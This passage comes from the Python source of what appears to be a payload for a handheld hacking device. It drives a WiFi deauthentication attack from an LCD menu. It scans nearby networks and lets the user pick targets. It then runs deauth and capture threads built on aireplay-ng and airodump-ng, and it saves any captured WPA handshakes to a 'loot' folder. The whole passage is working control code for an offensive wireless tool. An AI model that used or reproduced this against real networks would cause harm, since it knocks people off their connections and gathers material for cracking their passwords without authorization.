        draw.rectangle((1, 1, WIDTH - 2, HEIGHT - 2), outline=_T["ok"], width=3 if wide else 2)

    pad = 8 if large else (5 if wide else 3)
    y0 = hdr_h + pad
    y1 = HEIGHT - ftr_h - pad

    if WIDTH >= 480:
        # Top row: 4 KPI tiles
        kpi_h = 64
        gap = 8
        tw = (WIDTH - pad * 2 - gap * 3) // 4
        kpis = [
            ("DEAUTH PKTS", f"{stats['packets']:,}", _T["danger"]),
            ("TARGETS", str(len(targets)), _T["accent"]),
            ("EAPOL FRAMES" if mode == MODE_DEAUTH_CAPTURE else "ELAPSED",
             str(stats["eapol"]) if mode == MODE_DEAUTH_CAPTURE else _fmt_time(elapsed),
             _T["warn"]),
            ("HANDSHAKES" if mode == MODE_DEAUTH_CAPTURE else "MODE",
             str(stats["hs_captured"]) if mode == MODE_DEAUTH_CAPTURE else MODE_LABELS[mode],
             _T["ok"] if stats["hs_captured"] > 0 else _T["accent_bright"]),
        ]
        for idx_k, (lbl, val, acc) in enumerate(kpis):
            kx = pad + idx_k * (tw + gap)
            rj_theme.draw_card(
                draw, (kx, y0, kx + tw, y0 + kpi_h),
                fill=_T["bg_surface"], outline=_T["border_subtle"],
                radius=6, accent_left=acc, accent_width=4,
            )
            draw.text((kx + 12, y0 + 10), lbl, font=FONTS["badge"], fill=_T["text_muted"])
            draw.text((kx + 12, y0 + 30), rj_theme.truncate_text(draw, val, tw - 18, FONTS["title"]), font=FONTS["title"], fill=acc)

        # Bottom split: Active Targets table + Capture Status card
        by0 = y0 + kpi_h + pad
        mid = int(WIDTH * 0.62)
        rj_theme.draw_card(
            draw, (pad, by0, mid - pad // 2, y1),
            fill=_T["bg_surface"], outline=_T["border_subtle"],
            radius=6, accent_left=_T["danger"], accent_width=4,
        )
        tx = pad + 12
        ty = by0 + 10
        draw.text((tx, ty), "ACTIVE TARGETS", font=FONTS["badge"], fill=_T["danger"])
        ty += 20
        row_h = 24
        max_rows = max(1, (y1 - ty - 6) // row_h)
        for t in targets[:max_rows]:
            pw, _ = rj_theme.draw_pill(
                draw, tx, ty + 1, f"CH{t['channel']}", FONTS["badge"],
                bg=_T["bg_elevated"], fg=_T["accent_bright"], outline=None, pad_x=5, pad_y=1,
            )
            name_x = tx + pw + 8
            bssid_w = rj_theme.measure_text(FONTS["sub"], t["bssid"], draw)[2]
            name_max = max(40, (mid - pad // 2) - name_x - bssid_w - 18)
            draw.text((name_x, ty + 2), rj_theme.truncate_text(draw, t["essid"], name_max, FONTS["body_bold"]), font=FONTS["body_bold"], fill=_T["text_bright"])
            draw.text((mid - pad // 2 - bssid_w - 10, ty + 3), t["bssid"], font=FONTS["sub"], fill=_T["text_muted"])
            ty += row_h
        if len(targets) > max_rows:
            draw.text((tx, y1 - 20), f"+{len(targets) - max_rows} additional targets", font=FONTS["sub"], fill=_T["text_muted"])

        rx0 = mid + pad // 2
        rj_theme.draw_card(
            draw, (rx0, by0, WIDTH - pad, y1),
            fill=_T["bg_surface"], outline=_T["ok"] if flashing else _T["border_subtle"],
            radius=6, accent_left=_T["ok"] if stats["hs_captured"] > 0 else _T["accent"], accent_width=4,
        )
        rx = rx0 + 12
        ry = by0 + 10
        rw = WIDTH - pad - rx - 8
        draw.text((rx, ry), "TELEMETRY", font=FONTS["badge"], fill=_T["accent_bright"])
        ry += 22
        draw.text((rx, ry), f"Elapsed: {_fmt_time(elapsed)}", font=FONTS["body"], fill=_T["text_primary"])
        ry += 22
        draw.text((rx, ry), f"Mode: {MODE_LABELS[mode]}", font=FONTS["body"], fill=_T["accent_bright"])
        ry += 22
        if mode == MODE_DEAUTH_CAPTURE:
            if flashing:
                rj_theme.draw_pill(draw, rx, ry, "HANDSHAKE CAPTURED!", FONTS["badge"], bg=_T["ok_bg"], fg=_T["ok"], outline=_T["ok"], pad_x=6, pad_y=3)
                ry += 26
            last_hs = stats.get("hs_ssid", "") or "Waiting for EAPOL..."
            draw.text((rx, ry), "Last Capture:", font=FONTS["sub"], fill=_T["text_muted"])
            ry += 16
            draw.text((rx, ry), rj_theme.truncate_text(draw, last_hs, rw, FONTS["body_bold"]), font=FONTS["body_bold"], fill=_T["ok"] if stats["hs_captured"] else _T["text_muted"])
        else:
            draw.text((rx, ry), "Burst deauth active", font=FONTS["body"], fill=_T["warn"])
    else:
        # Compact Cardputer / 240x240 / 128x128 dashboard
        card_h = 46 if wide else (54 if HEIGHT >= 200 else 44)
        rj_theme.draw_card(
            draw, (pad, y0, WIDTH - pad, y0 + card_h),
            fill=_T["bg_surface"], outline=_T["ok"] if flashing else _T["border_subtle"],
            radius=5 if wide else 3, accent_left=_T["danger"], accent_width=3 if wide else 2,
        )
        tx = pad + (8 if wide else 5)
        draw.text((tx, y0 + 3), f"PKTS: {stats['packets']}", font=FONTS["title"] if wide else FONTS["body_bold"], fill=_T["danger"])
        t_txt = _fmt_time(elapsed)
        tw_px = rj_theme.measure_text(FONTS["sub"], t_txt, draw)[2]
        draw.text((WIDTH - pad - tw_px - 6, y0 + 4), t_txt, font=FONTS["sub"], fill=_T["text_muted"])
        y_mid = y0 + (24 if wide else (22 if HEIGHT >= 200 else 17))
        if mode == MODE_DEAUTH_CAPTURE:
            draw.text((tx, y_mid), f"EAPOL:{stats['eapol']}  HS:{stats['hs_captured']}", font=FONTS["body"] if wide else FONTS["sub"], fill=_T["ok"] if stats["hs_captured"] else _T["warn"])
            if flashing:
                draw.text((tx, y_mid + (12 if wide else 11)), "HS CAPTURED!", font=FONTS["badge"], fill=_T["ok"])
            elif stats["hs_captured"] > 0:
                draw.text((tx, y_mid + (12 if wide else 11)), rj_theme.truncate_text(draw, f"Last: {stats.get('hs_ssid', '')}", WIDTH - pad * 2 - 12, FONTS["sub"]), font=FONTS["sub"], fill=_T["ok"])
        else:
            tgt_lbl = targets[0]["essid"] if len(targets) == 1 else f"{len(targets)} targets active"
            draw.text((tx, y_mid), rj_theme.truncate_text(draw, tgt_lbl, WIDTH - pad * 2 - 12, FONTS["body"] if wide else FONTS["sub"]), font=FONTS["body"] if wide else FONTS["sub"], fill=_T["text_primary"])

        ly = y0 + card_h + (5 if wide else 3)
        step = 15 if wide else (14 if HEIGHT >= 200 else 10)
        for t in targets:
            if ly + step > y1:
                break
            line = f"CH{t['channel']}  {t['essid']}"
            draw.text((pad + 3, ly), rj_theme.truncate_text(draw, line, WIDTH - pad * 2 - 6, FONTS["sub"]), font=FONTS["sub"], fill=_T["text_primary"])
            ly += step

    _refresh()

# ---------------------------------------------------------------------------
# Screen: Setup status
# ---------------------------------------------------------------------------

def draw_status(msg, color=CLR_GREEN):
    draw.rectangle((0, 0, WIDTH - 1, HEIGHT - 1), fill=_T["bg_base"])
    _header("WIFI DEAUTH", CLR_YELLOW, CLR_BG_IDLE, badge="SETUP")
    kind = "err" if color in (CLR_RED, "#FF3333", "#FF0000") else "warn" if color in (CLR_YELLOW, "#FFCC00") else "ok"
    lines = [ln.strip() for ln in str(msg).splitlines() if ln.strip()] or [str(msg)]
    title = lines[0]
    sub = " ".join(lines[1:]) if len(lines) > 1 else ""
    rj_theme.draw_status_card(draw, WIDTH, HEIGHT, title, sub=sub, kind=kind, fonts=FONTS)
    _refresh()

# ---------------------------------------------------------------------------
# Flash effect for handshake capture
# ---------------------------------------------------------------------------

def flash_green_capture():
    """Obsidian Ember capture alert flash for handshake capture."""
    try:
        img = Image.new("RGB", (WIDTH, HEIGHT), _T["ok_bg"])
        d = ImageDraw.Draw(img)
        d.rectangle((2, 2, WIDTH - 3, HEIGHT - 3), outline=_T["ok"], width=3)
        rj_theme.draw_status_card(
            d, WIDTH, HEIGHT, "HANDSHAKE CAPTURED!",
            sub="Saved to loot/Handshakes", kind="ok", fonts=FONTS,
        )
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(0.5)
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Signal handlers
# ---------------------------------------------------------------------------

_running = True


def _signal_handler(signum, frame):
    global _running
    _running = False


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)

# ---------------------------------------------------------------------------
# Initialize log
# ---------------------------------------------------------------------------

try:
    with open(LOG_FILE, "w") as f:
        f.write(f"=== WiFi Deauth Log {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        f.write(f"Interface: {WIFI_INTERFACE}\n")
except Exception:
    pass

# ---------------------------------------------------------------------------
# Validate setup
# ---------------------------------------------------------------------------

draw_status(f"Checking {WIFI_INTERFACE}...")
ok, WIFI_INTERFACE = validate_setup(WIFI_INTERFACE)
if not ok:
    draw_status("Setup failed! Check USB dongle. KEY3=Exit", CLR_RED)
    while True:
        btn = get_button(PINS, GPIO)
        if btn == "KEY3":
            break
        time.sleep(0.1)
    LCD.LCD_Clear()
    GPIO.cleanup()
    sys.exit(1)

draw_status(f"Monitor OK: {WIFI_INTERFACE}", CLR_GREEN)
time.sleep(1)

# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

state = "idle"
scan_timeout = SCAN_TIMEOUT_DEFAULT
attack_mode = MODE_DEAUTH
networks = []
selected_index = 0
selected_targets = []
attack_stop = threading.Event()
attack_threads_list = []
attack_stats = {"packets": 0, "clients": 0, "eapol": 0, "hs_captured": 0, "hs_ssid": ""}
attack_start_time = 0
hs_flash_until = 0
prev_hs_count = 0
scan_start_time = 0

draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

try:
    while _running:
        btn = get_button(PINS, GPIO)
        now = time.time()

        # ---------------------------------------------------------------
        # IDLE
        # ---------------------------------------------------------------
        if state == "idle":
            if btn == "OK":
                # Debounce
                while get_button(PINS, GPIO) == "OK":
                    time.sleep(0.05)
                state = "scanning"
                scan_start_time = time.time()
                # Launch scan in background thread
                scan_result = [None]
                scan_cancelled = threading.Event()

                def _scan_worker():
                    result = scan_networks(WIFI_INTERFACE, scan_timeout)
                    if not scan_cancelled.is_set():
                        scan_result[0] = result

                scan_thread = threading.Thread(target=_scan_worker, daemon=True)
                scan_thread.start()

            elif btn == "LEFT":
                while get_button(PINS, GPIO) == "LEFT":
                    time.sleep(0.05)
                attack_mode = (attack_mode - 1) % len(MODE_LABELS)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "RIGHT":
                while get_button(PINS, GPIO) == "RIGHT":
                    time.sleep(0.05)
                attack_mode = (attack_mode + 1) % len(MODE_LABELS)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "UP":
                while get_button(PINS, GPIO) == "UP":
                    time.sleep(0.05)
                scan_timeout = min(60, scan_timeout + 5)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "DOWN":
                while get_button(PINS, GPIO) == "DOWN":
                    time.sleep(0.05)
                scan_timeout = max(5, scan_timeout - 5)
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "KEY3":
                _running = False
                break

            else:
                time.sleep(0.05)

        # ---------------------------------------------------------------
        # SCANNING
        # ---------------------------------------------------------------
        elif state == "scanning":
            elapsed = now - scan_start_time
            draw_scanning(elapsed, scan_timeout)

            if btn == "KEY3":
                while get_button(PINS, GPIO) == "KEY3":
                    time.sleep(0.05)
                scan_cancelled.set()
                state = "idle"
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)
                continue

            # Check if scan finished
            if scan_result[0] is not None or not scan_thread.is_alive():
                scan_thread.join(timeout=2)
                networks = scan_result[0] if scan_result[0] else []
                if networks:
                    selected_index = 0
                    selected_targets = []
                    state = "select"
                    draw_select(networks, selected_index, selected_targets, attack_mode)
                else:
                    draw_status(f"No networks found. KEY3=Back", CLR_RED)
                    time.sleep(2)
                    state = "idle"
                    draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            time.sleep(0.1)

        # ---------------------------------------------------------------
        # SELECT
        # ---------------------------------------------------------------
        elif state == "select":
            if btn == "UP":
                while get_button(PINS, GPIO) == "UP":
                    time.sleep(0.05)
                selected_index = (selected_index - 1) % len(networks)
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "DOWN":
                while get_button(PINS, GPIO) == "DOWN":
                    time.sleep(0.05)
                selected_index = (selected_index + 1) % len(networks)
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "OK":
                while get_button(PINS, GPIO) == "OK":
                    time.sleep(0.05)
                net = networks[selected_index]
                bssids_sel = {t["bssid"] for t in selected_targets}
                if net["bssid"] in bssids_sel:
                    selected_targets = [t for t in selected_targets if t["bssid"] != net["bssid"]]
                else:
                    selected_targets = selected_targets + [net]
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "LEFT" or btn == "RIGHT":
                while get_button(PINS, GPIO) in ("LEFT", "RIGHT"):
                    time.sleep(0.05)
                attack_mode = (attack_mode + 1) % len(MODE_LABELS)
                draw_select(networks, selected_index, selected_targets, attack_mode)

            elif btn == "KEY1":
                # Rescan
                while get_button(PINS, GPIO) == "KEY1":
                    time.sleep(0.05)
                state = "scanning"
                scan_start_time = time.time()
                scan_result = [None]
                scan_cancelled = threading.Event()

                def _scan_worker():
                    result = scan_networks(WIFI_INTERFACE, scan_timeout)
                    if not scan_cancelled.is_set():
                        scan_result[0] = result

                scan_thread = threading.Thread(target=_scan_worker, daemon=True)
                scan_thread.start()

            elif btn == "KEY2":
                # Start attack
                while get_button(PINS, GPIO) == "KEY2":
                    time.sleep(0.05)
                if not selected_targets:
                    draw_status("No targets selected!", CLR_RED)
                    time.sleep(1.5)
                    draw_select(networks, selected_index, selected_targets, attack_mode)
                    continue

                # Prepare attack
                attack_stop = threading.Event()
                attack_threads_list = []
                attack_stats = {
                    "packets": 0,
                    "clients": len(selected_targets),
                    "eapol": 0,
                    "hs_captured": 0,
                    "hs_ssid": "",
                }
                prev_hs_count = 0
                hs_flash_until = 0

                # Kill leftovers
                run_command("pkill -f aireplay-ng")
                run_command("pkill -f airodump-ng")
                time.sleep(0.5)

                # Start deauth worker
                t_atk = threading.Thread(
                    target=start_attack_worker,
                    args=(selected_targets, WIFI_INTERFACE, attack_stop, attack_stats),
                    daemon=True,
                )
                t_atk.start()
                attack_threads_list.append(t_atk)

                # Start capture worker if mode is DTH+CAP
                if attack_mode == MODE_DEAUTH_CAPTURE:
                    t_cap = threading.Thread(
                        target=start_capture_worker,
                        args=(selected_targets, WIFI_INTERFACE, attack_stop, attack_stats),
                        daemon=True,
                    )
                    t_cap.start()
                    attack_threads_list.append(t_cap)

                attack_start_time = time.time()
                state = "attacking"
                log(f"Attack started: {len(selected_targets)} targets, mode={MODE_LABELS[attack_mode]}")

            elif btn == "KEY3":
                while get_button(PINS, GPIO) == "KEY3":
                    time.sleep(0.05)
                state = "idle"
                draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            else:
                time.sleep(0.05)

        # ---------------------------------------------------------------
        # ATTACKING
        # ---------------------------------------------------------------
        elif state == "attacking":
            elapsed = now - attack_start_time

            # Check for new handshake captures -> flash
            if attack_stats["hs_captured"] > prev_hs_count:
                prev_hs_count = attack_stats["hs_captured"]
                hs_flash_until = now + 3.0
                flash_green_capture()

            draw_attack_dashboard(
                selected_targets, attack_stats, elapsed,
                attack_mode, hs_flash_until,
            )

            if btn == "KEY2":
                while get_button(PINS, GPIO) == "KEY2":
                    time.sleep(0.05)
                stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
                attack_threads_list = []
                draw_status("Attacks stopped", CLR_YELLOW)
                time.sleep(1.5)
                # Re-enter monitor mode for potential rescan
                ok, WIFI_INTERFACE = validate_setup(WIFI_INTERFACE)
                state = "select"
                if networks:
                    draw_select(networks, selected_index, selected_targets, attack_mode)
                else:
                    state = "idle"
                    draw_idle(WIFI_INTERFACE, scan_timeout, attack_mode)

            elif btn == "KEY3":
                while get_button(PINS, GPIO) == "KEY3":
                    time.sleep(0.05)
                stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
                attack_threads_list = []
                _running = False
                break

            time.sleep(0.2)

finally:
    # Ensure cleanup
    if attack_threads_list:
        stop_all(attack_stop, attack_threads_list, WIFI_INTERFACE)
    else:
        run_command("pkill -f aireplay-ng 2>/dev/null || true")
        run_command("pkill -f airodump-ng 2>/dev/null || true")
        run_command(f"nmcli device set {WIFI_INTERFACE} managed yes 2>/dev/null || true")
    draw_status("Payload finished")
    time.sleep(1)
    LCD.LCD_Clear()
    GPIO.cleanup()
